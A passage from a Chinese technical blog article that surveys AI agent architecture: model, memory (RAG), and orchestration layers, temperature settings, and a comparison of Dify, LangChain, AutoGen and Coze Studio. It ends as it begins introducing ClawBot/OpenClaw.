                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读45分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">agent的全景认知和一个node沙盒小工具</h2>
<hr/>
<h3 data-id="heading-1">一、AI 认知模型全景视图</h3>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────┐
│  应用层 (Application)                                        │
│  Manus · ClawBot  · 垂直领域 Agent              │
├─────────────────────────────────────────────────────────────┤
│  编排层 (Orchestration)                                      │
│  <span class="hljs-built_in">Dify</span>(低代码) · <span class="hljs-built_in">LangChain</span>(编程框架) · <span class="hljs-built_in">LangGraph</span>(状态机)        │
├─────────────────────────────────────────────────────────────┤
│  记忆层 (Memory)                                             │
│  Vector DB · RAG · 上下文压缩 · 长期记忆机制 · Milvus          │
├─────────────────────────────────────────────────────────────┤
│  模型层 (Foundation Model)                                   │
│  GPT-<span class="hljs-number">4</span>o · Claude · DeepSeek · 多模态大模型                    │
└─────────────────────────────────────────────────────────────┘
</code></pre>
<p>未来的 AI 应用不是「大模型单打独斗」，而是「记忆 + 规划 + 工具」的<strong>认知架构</strong>竞争。</p>
<p>我们该在未来的 AI 时代中何去何从？我认为是借助 AI 的能力，去实现类似于 ClawBot 这种 AI 应用，解决<strong>模型到落地的最后一公里</strong>问题。</p>
<hr/>
<h3 data-id="heading-2">二、认识模型：从 DeepSeek 的开放平台开始</h3>
<p>这里会给大家介绍两个平台：</p>
<ol>
<li><strong>DeepSeek 开放平台</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fapi-docs.deepseek.com%2Fzh-cn%2F" target="_blank" title="https://api-docs.deepseek.com/zh-cn/" ref="nofollow noopener noreferrer">api-docs.deepseek.com/zh-cn/</a>参数较少，适合初步认知。</li>
<li><strong>阿里云百炼</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fbailian.console.aliyun.com%2Fcn-beijing%2F%3Fspm%3D5176.29597918.J_SEsSjsNv72yRuRFS2VknO.2.739e7b08QDsLcK%26tab%3Ddoc%23%2Fdoc%2F%3Ftype%3Dmodel%26url%3D2579562" target="_blank" title="https://bailian.console.aliyun.com/cn-beijing/?spm=5176.29597918.J_SEsSjsNv72yRuRFS2VknO.2.739e7b08QDsLcK&amp;tab=doc#/doc/?type=model&amp;url=2579562" ref="nofollow noopener noreferrer">阿里云百炼控制台</a>
类似 OpenAI，模型丰富、支持自定义调试，文档详细，适合高自定义、多 Agent 协作等场景。</li>
</ol>
<p>一般会有 <strong>Base API</strong>（用于访问模型），需要填入生成的 <strong>API Key</strong>（密钥）。根据所用框架或编排工具，选择对应的模型名，如 DeepSeek 的 <strong>Chat 模型</strong>与 <strong>Reasoner 模型</strong>，各有侧重点。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6d4d78619324e8191cd6dfb3f8b289c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFuc2hhd2Fy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770694444&amp;x-signature=suwlXowxtcKNGyakkpJZ5YXvG5k%3D" alt="1770002384080.png" loading="lazy"/></p>
<p>除此之外，一般还会有**温度（Temperature）**设置，可以理解为模型的「<strong>创意开关</strong>」或「<strong>发散程度调节器</strong>」，核心是概率分布的尖锐度。</p>
<blockquote>
<p><strong>温度越低，模型越像「严谨的老师」；温度越高，模型越像「喝醉的诗人」。</strong></p>
</blockquote>



































<table><thead><tr><th>温度值</th><th>特征</th><th>典型应用</th><th>输出特点</th></tr></thead><tbody><tr><td><strong>0 - 0.3</strong></td><td>确定性/保守</td><td>代码生成、数学计算、知识问答、JSON</td><td>事实准确、逻辑严谨，可能机械、缺乏变化</td></tr><tr><td><strong>0.4 - 0.7</strong></td><td>平衡</td><td>通用对话、写作辅助、商业文案</td><td>正确性与自然流畅度兼顾</td></tr><tr><td><strong>0.8 - 1.2</strong></td><td>创造性</td><td>创意写作、头脑风暴、诗歌、角色扮演</td><td>词汇丰富、想象力强，可能跑题</td></tr><tr><td><strong>&gt; 1.5</strong></td><td>混乱/发散</td><td>艺术实验、随机灵感、对抗性测试</td><td>可能荒诞、跳跃、非逻辑</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3">三、现代模型进化的四大共同趋势</h3>
<ol>
<li><strong>Agentic 能力（自主代理）<strong>所有模型都在强化</strong>工具调用链、多步骤规划、环境交互</strong>能力。Gartner 将 Agentic AI 列为 2025 年顶级战略技术趋势，预计年增长率 40%（<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.webpronews.com%2Fagentic-ai-tops-gartners-2025-trends-autonomous-revolution%2F" target="_blank" title="https://www.webpronews.com/agentic-ai-tops-gartners-2025-trends-autonomous-revolution/" ref="nofollow noopener noreferrer">来源</a>）。</li>
<li><strong>推理架构的显性化</strong>不再隐藏思考过程，而是提供「思考模式」（Thinking/Deep Think）开关，让用户在速度与深度间权衡，代表从<strong>模式匹配到结构化推理</strong>的范式转移。</li>
<li><strong>上下文窗口的军备竞赛</strong>从 256K（Kimi）到 400K（GPT-5）再到 1M（Claude），目标都是实现**「整本书/整个代码库」的一次性处理**，降低对 RAG 精度的依赖。</li>
<li><strong>垂直专业化与成本分层</strong>
同一模型家族内部分化出标准版（推理）、Mini 版（成本）、Nano 版（延迟），通过<strong>自动路由</strong>为用户匹配最优性价比。</li>
</ol>
<p>以上是结合当前模型更新汇总的结论：主流模型主要在<strong>工具调用、推理架构、上下文、成本</strong>四个方向优化。</p>
<p>下文将围绕 <strong>AI 工具调用</strong>展开：为什么各大模型厂商都重视它，以及它由哪些解决方案组成。</p>
<p>对于生产级模型落地（而非简单 API 调用），<strong>记忆层和编排层是概念上必须经过的两大关卡</strong>。即使没有显式使用 Milvus 或 LangChain，系统也必然要实现这两层的等效功能（哪怕用代码硬编码）。这两者都是编码层面具有代表性的工具，我们可以不直接用，但需要理解其思想。</p>
<hr/>
<h3 data-id="heading-4">四、记忆层：解决「模型天生健忘」的硬伤</h3>
<p>基础大模型是**无状态（Stateless）**的——每次 API 请求独立，不会记得 5 分钟前的对话，更无法记住上周的业务数据。</p>
<p><strong>落地时必须处理的问题：</strong></p>
<ul>
<li><strong>上下文稀缺</strong>：即便 GPT-5 支持 400K tokens，全量塞进上下文既贵又慢，且无法跨会话保持。</li>
<li><strong>知识过时</strong>：模型训练数据有截止日期，需要 RAG 接入实时知识库。</li>
<li><strong>个性化缺失</strong>：没有记忆层，每次对话从零开始，无法「越用越懂你」。</li>
</ul>
<p>大量上下文会带来：一、干扰多，结论不精确；二、token 消耗大、分析时间更长；三、难以对企业内部资源做有效整合。</p>
<p><strong>落地形态对比：</strong></p>





















<table><thead><tr><th>简单玩具</th><th>生产级落地</th></tr></thead><tbody><tr><td>直接塞历史消息到 <code>messages</code> 参数</td><td><strong>向量数据库</strong>（Milvus/Pinecone）存储海量文档</td></tr><tr><td>用全局变量存临时状态</td><td><strong>长期记忆机制</strong>（如 MemGPT）管理记忆优先级</td></tr><tr><td>不管 token 消耗</td><td><strong>上下文压缩</strong>（RAG 重排序、摘要机制）控制成本</td></tr></tbody></table>
<p><strong>本质</strong>：记忆层是让模型从「考试机器」变成「业务专家」的基础设施。没有它，模型只能回答通用问题，无法处理企业私有知识或保持连续性。我们下面主要来讲rag模式 还有history管理方案 这个则是在各个编排工具内各有内置的方案 我们在此不做深入研究</p>
<hr/>
<h4 data-id="heading-5">4.1 什么是 RAG（Retrieval Augmented Generation）</h4>
<p>RAG（检索增强生成）结合了信息检索与文本生成，在大模型生成答案时利用外部知识库中的相关信息。效果由三个核心阶段决定：</p>
<blockquote>
<p>引用：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Fmodel-studio%2Frag-optimization%3Fspm%3Da2c4g.11186623.help-menu-2400256.d_1_6_1.68277b8aB06TuT%26scm%3D20140722.H_2859102._.OR_help-T_cn~zh-V_1" target="_blank" title="https://help.aliyun.com/zh/model-studio/rag-optimization?spm=a2c4g.11186623.help-menu-2400256.d_1_6_1.68277b8aB06TuT&amp;scm=20140722.H_2859102._.OR_help-T_cn~zh-V_1" ref="nofollow noopener noreferrer">阿里云 RAG 检索说明</a></p>
</blockquote>
<ol>
<li><strong>建立索引</strong>：知识的解析、切片与向量化。</li>
<li><strong>检索召回</strong>：根据用户查询（Prompt），从向量存储中匹配并召回相关知识片段。</li>
<li><strong>生成答案</strong>：大模型根据召回片段与用户查询，生成最终答案。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/417ef9a912a8412d839ef0a5332b8bcb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWFuc2hhd2Fy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770694444&amp;x-signature=CzdP59dmYhCsjzbxQ5%2FhqTxM%2BLo%3D" alt="1770003943187.png" loading="lazy"/></p>
<p>在 LangChain 官网，RAG 架构分为三种模式，层层递进。</p>
<hr/>
<h4 data-id="heading-6">4.2 RAG 流程一：建立索引（Indexing）</h4>
<ol>
<li>**Loader（加载）**通过<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fjavascript%2Flangchain%2Fretrieval%23document_loaders" target="_blank" title="https://docs.langchain.com/oss/javascript/langchain/retrieval#document_loaders" ref="nofollow noopener noreferrer">文档加载器</a>加载文档，主要完成读取文件。</li>
<li><strong>Split（拆分）</strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fjavascript%2Flangchain%2Fretrieval%23text_splitters" target="_blank" title="https://docs.langchain.com/oss/javascript/langchain/retrieval#text_splitters" ref="nofollow noopener noreferrer">文本拆分器</a>将大型 <code>Document</code> 拆成更小的块，便于索引和放入模型有限的上下文窗口。若文档超过约 42000 字符，对多数模型过长；即使能塞进上下文，极长输入下也难定位关键信息，因此需要先切块再嵌入与存储。</li>
<li><strong>存储</strong>
通过<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fjavascript%2Flangchain%2Fretrieval%23vectorstores" target="_blank" title="https://docs.langchain.com/oss/javascript/langchain/retrieval#vectorstores" ref="nofollow noopener noreferrer">向量存储</a>与<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fjavascript%2Flangchain%2Fretrieval%23embedding_models" target="_blank" title="https://docs.langchain.com/oss/javascript/langchain/retrieval#embedding_models" ref="nofollow noopener noreferrer">嵌入模型</a>将切分后的内容向量化并存入（如 Milvus），便于检索。</li>
</ol>
<p><strong>文本如何变成向量？</strong>
通过 <strong>Embeddings 模型</strong>将文本转为向量，再写入 Milvus 等向量数据库，供 AI 检索。</p>
<p>示例：</p>
<pre><code class="hljs language-text" lang="text">Dimension of embeddings: 1536
Input: 风急天高猿啸哀, embedding is: [-0.0016666285653348784, 0.008690492014557004, ...]
Input: 渚清沙白鸟飞回, embedding is: [0.018255604113922633, 0.030631669725945727, ...]
Input: 无边落木萧萧下, embedding is: [-0.01270165436681136, 0.011355212676752505, ...]
Input: 不尽长江滚滚来, embedding is: [0.003449439128962428, 0.02667092110022496, ...]
</code></pre>
<hr/>
<h4 data-id="heading-7">4.3 RAG 流程二：检索与生成 —— Agent 调用向量数据库</h4>
<h5 data-id="heading-8">检索的本质：语义匹配</h5>
<p>当用户问：「<strong>公司的年假怎么休？</strong>」</p>
<ul>
<li><strong>传统搜索</strong>：在数据库里找包含「年假」关键词的文档（可能漏掉「带薪休假」「年休假」等同义表达）。</li>
<li><strong>向量检索</strong>：
<ul>
<li>把问题转成向量（Embedding），如 <code>[0.023, -0.151, 0.892, ...]</code>（768 维或 1536 维）。</li>
<li>在 Milvus 中计算<strong>余弦相似度</strong>，找到向量距离最近的文本块。</li>
<li>返回 Top 5 最相关段落（即使没出现「年假」二字，语义相关也能找到）。</li>
</ul>
</li>
</ul>
<h5 data-id="heading-9">把检索封装成「工具」（Tool）</h5>
<p>Agent 默认没有查库能力，需要把检索包装成**工具（Tool）**才能调用。在提示词中说明：当问题属于某类时，使用向量数据库做相似度搜索，返回相关片段；Agent 整合搜索结果后，由大模型生成答案。向量库也可在此阶段加筛选条件，在百万级数据场景下很有用。</p>
<p>完成上述两步，即得到一个基础的 RAG 检索流程，在 LangChain 官网称为 <strong>2-Step RAG（两步检索增强生成）</strong>。</p>
<p>此外还有两种进阶方式：</p>
<ol>
<li>
<p>**Agentic RAG（智能体检索增强生成）**由大模型判断是否需要文档/数据库查询、网络 API 等外部调用，再决定调用哪些工具。</p>
</li>
<li>
<p><strong>Hybrid RAG（混合检索增强生成）<strong>在标准模式基础上加入</strong>多重校验</strong>：</p>
<ul>
<li>对问题做评估（可调用 Agent/工具），若判断问题不合理则改写后重查；</li>
<li>对检索结果用 Agent 评估，不合标准则重新检索；</li>
<li>由 AI 自行判断错误并从对应节点重新开始。</li>
</ul>
</li>
</ol>
<hr/>
<h4 data-id="heading-10">4.4 三种 RAG 模式概览</h4>
<h5 data-id="heading-11">方案 A：标准模式（2-Step RAG）</h5>
<p><strong>「先查资料，再回答」——简单直接。</strong></p>
<p><strong>工作流程：</strong></p>
<ol>
<li>用户提问：「今年的差旅报销标准是什么？」</li>
<li>系统<strong>自动</strong>在知识库找到《财务制度》第 3 章相关内容。</li>
<li>AI 基于该内容生成回答，并标注来源。</li>
</ol>
<p><strong>核心价值：</strong></p>
<ul>
<li><strong>快</strong>：固定流程，一次检索 + 一次生成，响应在 2 秒内。</li>
<li><strong>省成本</strong>：步骤简单，调用 AI 次数少。</li>
<li><strong>稳</strong>：结果可预测，不会「乱翻书」。</li>
</ul>
<hr/>
<h5 data-id="heading-12">方案 B：智能模式（Agentic RAG）</h5>
<p><strong>「让 AI 自己决定要不要查资料」。</strong></p>
<p><strong>工作流程：</strong></p>
<ol>
<li>用户复杂提问：「对比我们公司和竞争对手在华东区的定价策略差异，并给出建议。」</li>
<li>AI <strong>自主分析</strong>：「需要分三步：先查内部定价表（工具1），再查竞品公开信息（工具2），最后做对比分析。」</li>
<li>AI 按需调用多个工具，层层推进，最终生成报告。</li>
</ol>
<p><strong>核心价值：</strong></p>
<ul>
<li><strong>灵活</strong>：复杂问题能「见招拆招」。</li>
<li><strong>多工具协作</strong>：可查文档、计算器、数据库、实时网页等。</li>
<li><strong>类人思维</strong>：先收集信息再下结论。</li>
</ul>
<hr/>
<h5 data-id="heading-13">方案 C：质控模式（Hybrid RAG）</h5>
<p><strong>「查完还要验，错了就重来」——带质检的严谨方案。</strong></p>
<p><strong>工作流程：<strong>在标准模式基础上加入</strong>三重校验</strong>：</p>
<ol>
<li><strong>问题优化</strong>：用户问得模糊？先改写成更精准的问题（如把「那个谁」改为「张三」）。</li>
<li><strong>检索验证</strong>：查到内容是否相关？若不相关，自动换关键词重查。</li>
<li><strong>答案核查</strong>：生成回答是否符合事实？若有矛盾，重新生成或标注「存疑」。</li>
</ol>
<p><strong>核心价值：</strong></p>
<ul>
<li><strong>风险可控</strong>：每步有校验，减少用错误信息作答。</li>
<li><strong>自我修正</strong>：发现答非所问或信息不足时，可自主优化流程。</li>
<li><strong>审计友好</strong>：全程可追溯，知道参考了哪些资料、为何这样答。</li>
</ul>
<h3 data-id="heading-14">五、编排层</h3>
<p>模型和记忆都有了，还要有人决定：什么时候调模型、什么时候查库、什么时候调工具、顺序怎么排——这一层就是编排层。好比上文的rag的生成 什么时候去查询向量数据库 如何对问题进行分析 如何评估搜寻的结果是否满意 我们需要借助编排工具去实现 ，当然 在下一层的manus 或者 clawbot （openclaw），他们并没有使用这里编排工具的一种，而是自己搭建的编排工具</p>
<h4 data-id="heading-15">5.1 主流编排工具对比（GitHub Stars 与优缺点）</h4>
<p>以下为当前较主流的四类编排工具，兼顾<strong>可视化/低代码</strong>与<strong>编码/框架</strong>两种路线，便于按团队习惯选型。</p>








































<table><thead><tr><th>工具</th><th>类型</th><th>GitHub Stars</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flanggenius%2Fdify" target="_blank" title="https://github.com/langgenius/dify" ref="nofollow noopener noreferrer">Dify</a></strong></td><td>可视化 / 低代码平台</td><td><strong>128k</strong></td><td>工作流 + RAG + Agent 一体；可视化画布、Prompt IDE；50+ 内置工具；Docker 一键部署、多模型支持；LLMOps 与观测完善</td><td>自托管需自行维护；企业级能力依赖商业版；偏「平台」思维，深度定制要理解其抽象</td></tr><tr><td><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flangchain-ai%2Flangchain" target="_blank" title="https://github.com/langchain-ai/langchain" ref="nofollow noopener noreferrer">LangChain</a></strong></td><td>编程框架（Python/JS）</td><td><strong>126k</strong></td><td>生态最大、文档与社区成熟；可编程、灵活度高；与 LangGraph、LangSmith 等配套；模型/向量库/工具集成丰富</td><td>学习曲线陡；版本迭代快、API 易变；偏开发者，无开箱即用的可视化编排</td></tr><tr><td><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2Fautogen" target="_blank" title="https://github.com/microsoft/autogen" ref="nofollow noopener noreferrer">AutoGen</a></strong></td><td>多智能体编程框架</td><td><strong>54.2k</strong></td><td>多智能体对话与协作原生支持；微软背书；支持 MCP、AgentTool 等；提供 AutoGen Studio 可做低代码原型</td><td>官方建议新人关注 Microsoft Agent Framework；维护重心可能向新框架倾斜；纯代码编排需一定 Python 能力</td></tr><tr><td><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoze-dev%2Fcoze-studio" target="_blank" title="https://github.com/coze-dev/coze-studio" ref="nofollow noopener noreferrer">Coze Studio</a></strong></td><td>可视化 Agent 开发平台</td><td><strong>19.7k</strong></td><td>脱胎于字节 Coze，一站式可视化；插件、知识库、工作流、API/SDK 齐全；Go 后端 + React/TS 前端，DDD 架构，便于二次开发</td><td>相对较新，生态小于 Dify/LangChain；需自建并配置模型；公有云能力与商业版有差异</td></tr></tbody></table>
<p><strong>选型参考</strong>：要<strong>快速搭 Demo、少写代码</strong>优先看 Dify 或 Coze Studio；要<strong>全代码控制、对接自有系统</strong>优先 LangChain / LangGraph；要做<strong>多 Agent 协作、研究向</strong>可看 AutoGen 或 LangGraph。</p>
<hr/>
<h4 data-id="heading-16">5.2 重点了解：Dify 与 LangChain</h4>
<p>下文主要围绕 <strong>Dify</strong> 和 <strong>LangChain</strong> 两种编排方式展开，并举例说明各自适用场景。得益于 <strong>MCP</strong> 等协议的发展，两者并非互斥，而是形成很好的<strong>互补关系</strong>：</p>
<ul>
<li><strong>简单到中等复杂度的 AI 应用</strong>：适合用 <strong>Dify</strong>（可视化、少写代码、快速上线）。</li>
<li><strong>高度复杂、强定制的应用</strong>：适合用 <strong>LangChain</strong>（全代码控制、深度集成业务、自定义链与 Agent）。</li>
</ul>
<p>编排工具会不断更新、被更好的替代，但<strong>编排逻辑</strong>和<strong>AI 相关概念</strong>（记忆、分类、流式、并行、Agent 汇总等）是通用的——这些思想可以套用在 Dify 上，也值得长期学习。</p>
<hr/>
<h4 data-id="heading-17">5.3 Dify 简介：能帮我们做什么？</h4>
<p>Dify 是<strong>低代码/可视化</strong>编排工具。借用官网描述：</p>
<blockquote>
<p><strong>Dify</strong> 是一个用于构建 AI 工作流的开源平台。通过在可视化画布上编排 AI 模型、连接数据源、定义处理流程，直接将你的领域知识转化为可运行的软件。</p>
</blockquote>
<p><strong>能力概览</strong>：支持<strong>本地化部署</strong>；可使用<strong>插件能力</strong>对接外部 API/数据库；通过<strong>模板节点</strong>输出结构化数据（如 JSON），便于前端或下游系统处理。了解这些，就能快速搭建以下几类场景。</p>
<hr/>
<h4 data-id="heading-18">5.4 Dify 场景示例</h4>
<ol>
<li><strong>表单预填</strong>用户进入表单页时，调用<strong>插件</strong>查询近几次提交或用户偏好，经<strong>模板节点</strong>输出预填数据（如 JSON），前端解析后填充表单。要点：插件查数据 + 模板节点出结构化结果，方便对接。</li>
<li><strong>文本片段补全</strong>根据前文内容补全后续文本。创建 <strong>Chatflow</strong> 并开启<strong>流式输出</strong>，用<strong>代码节点</strong>做后处理使输出更可控；用<strong>问题分类器节点</strong>将请求路由到最合适的场景；启用<strong>记忆</strong>，在分类与补全时带入对话历史，提高多轮准确性。实际可做成「每输入一段或停顿一段时间再触发补全」，以平衡体验与成本。</li>
<li><strong>长文本汇总助手</strong>
文本量大时，用<strong>多个输入节点</strong>对长文分块、<strong>并发处理</strong>，最后汇聚到<strong>一个 Agent 节点</strong>做汇总。并发能缩短总耗时（整体处理速度/吞吐提升），并可能因分块聚焦而提高汇总质量。</li>
</ol>
<p>以上示例体现了 Dify 中<strong>插件、模板、流式、分类、记忆、并行与汇聚</strong>等编排思想，这些概念在 LangChain 等框架中同样存在，只是实现方式从「画布拖拽」变成了「代码编排」。</p>
<hr/>
<h4 data-id="heading-19">5.5 LangChain 简介</h4>
<p>LangChain 是<strong>编程优先</strong>的 AI 应用编排框架（支持 Python / JavaScript），通过代码组装模型、提示词、工具、记忆与向量库等组件，构建可复用的链（Chain）与智能体（Agent）。借用官网定位：</p>
<blockquote>
<p><strong>LangChain</strong> 是构建 LLM 应用的平台。它通过统一的接口连接模型、嵌入、向量存储、检索与工具等，让开发者快速从原型迭代到生产，并随技术演进保持可扩展。</p>
</blockquote>
<p><strong>与 Dify 的对比</strong>：Dify 用画布和节点完成编排，LangChain 用代码定义每一步——链式调用、条件分支、工具选择、多轮记忆等都由你显式控制，适合需要深度定制、对接自有系统或实现复杂 Agent 逻辑的场景。</p>
<p><strong>核心概念速览</strong>：</p>
<ul>
<li><strong>Chain</strong>：把提示词、模型、解析等步骤串成一条流水线（如 RAG 链：检索 → 拼上下文 → 调用模型 → 解析输出）。</li>
<li><strong>Agent</strong>：由模型根据当前输入决定「下一步调用哪个工具、传什么参数」，多步推理与工具调用循环进行。</li>
<li><strong>Tool</strong>：可被 Agent 调用的能力单元（查库、调 API、执行代码等），在 LangChain 中通常封装为函数并绑定到模型。</li>
<li><strong>Memory</strong>：在对话或链式调用中持久化/读取历史（如缓冲记忆、摘要记忆），供多轮对话或长流程使用。</li>
</ul>
<p>下面列举 LangChain 的<strong>实际使用场景</strong>及简要实现思路。</p>
<ol>
<li><strong>API 文档分析，生成 Mock 接口</strong>用 <strong>Chain</strong> 串联：解析文档（如 OpenAPI/Swagger）→ 提取路径、参数、响应结构 → 用 LLM 生成对应 Mock 数据或 Mock 服务代码；可配合模板和校验步骤，保证输出格式稳定。</li>
<li><strong>低代码平台 AI 生成自定义组件</strong>用 <strong>Agent + Tool</strong>：把「读设计稿/需求描述」「查组件库 API」「写代码」「执行预览」封装成 Tool，由模型按需调用；多轮时可启用 <strong>Memory</strong> 记住已选组件和约束，保证风格一致。</li>
<li><strong>自动化运维部署、仓库管理</strong>
用 <strong>Agent + Tool</strong>：将执行命令、读仓库状态、发 MR、查流水线等封装为 Tool，由 Agent 根据自然语言指令选择并执行；复杂流程可用 <strong>LangGraph</strong> 做有状态编排，或与现有 CI/CD 脚本对接。</li>
</ol>
<p><strong>延伸</strong>：以上场景都是「代码里显式定义每一步」，适合对可控性、可测试性和与现有系统集成要求高的场景。若需要快速出 Demo 或给业务方拖拽式配置，可先用 Dify 搭主流程，再用 LangChain（或通过 MCP 暴露的能力）承接复杂逻辑与自动化，二者形成互补。</p>
<hr/>
<h3 data-id="heading-20">六、AI 集成应用与 ClawBot 简介</h3>
<p>前文提到的<strong>模型层、记忆层、编排层</strong>是「能力层」，最终要落到用户能直接使用的<strong>应用</strong>上。本节说明什么是 <strong>AI 集成应用</strong>，并以 <strong>ClawBot / OpenClaw</strong> 为例，说明它们与各层的关系、做了哪些创新，以及自研框架与 Dify/LangChain 等流行框架的异同。更详细的介绍可参考：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F2000850539936765122" target="_blank" title="https://zhuanlan.zhihu.com/p/2000850539936765122" ref="nofollow noopener noreferrer">知乎 · ClawBot 相关讨论</a>。</p>
<h4 data-id="heading-21">6.1 什么是 AI 集成应用</h4>
<p><strong>AI 集成应用</strong>指的是：把<strong>模型层（推理）、记忆层（RAG/长期记忆）、编排层（何时调模型、何时查库、何时调工具）<strong>以及</strong>工具能力（填表、发邮件、跑脚本、控制设备等）<strong>打包成</strong>终端用户可直接使用的产品</strong>——例如聊天机器人、个人助理、垂直领域 Agent 等。用户不关心底层用的是哪家模型、哪套向量库，只关心「能对话、能办事、能记住我」。</p>
<p>与分层的关系可以简单理解为：</p>






























